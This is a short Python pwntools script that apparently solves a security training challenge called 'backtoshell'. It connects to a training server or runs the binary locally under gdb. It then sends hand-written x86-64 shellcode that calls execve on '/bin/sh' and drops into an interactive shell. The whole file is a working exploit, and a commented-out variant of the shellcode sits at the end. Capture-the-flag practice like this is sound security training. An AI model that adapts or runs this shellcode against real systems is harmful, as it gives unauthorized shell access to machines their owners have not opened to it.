from pwn import *
context.update(arch='amd64', os='linux')

context.terminal=['tmux','splitw','-h']

if "REMOTE" in args:

    p=remote("bin.training.offdef.it", 3001)

else:
    p=process("./backtoshell")
    gdb.attach(p,"""
    
    """)


shellcode="""
mov rdi,rax
add rdi,0x10
mov rax,0x3b
syscall
"""
p.send(asm(shellcode)+b"/bin/sh\x00")
p.interactive()

#mov rdi,rax
#add rdi,0x10
#mov rax,0x3b
#.byte "/bin/sh\x00"
#syscall